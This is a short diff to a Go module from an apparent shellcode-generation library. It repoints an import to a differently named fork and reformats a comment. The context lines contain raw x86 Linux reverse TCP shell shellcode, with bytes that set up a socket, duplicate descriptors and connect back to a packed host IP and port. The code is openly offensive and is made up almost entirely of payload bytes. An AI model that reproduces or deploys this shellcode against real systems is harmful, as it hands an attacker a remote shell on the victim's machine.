@@ -1,6 +1,6 @@
 package modules
 
-import "github.com/Binject/shellcode/api"
+import "github.com/sanitycheck/binject-shellcode/api"
 
 func init() {
 	api.RegisterShellCode(api.Linux, api.Intel32,
@@ -27,7 +27,7 @@ func reverse_tcp_shell_linux_intel_32(params api.Parameters) ([]byte, error) {
 	shellcode1 += "\xff\xe5"
 	shellcode1 += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" +
 		"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68"
-		//HOST
+	//HOST
 	shellcode1 += api.PackIP(ip)
 	shellcode1 += "\x68\x02\x00"
 	//PORT
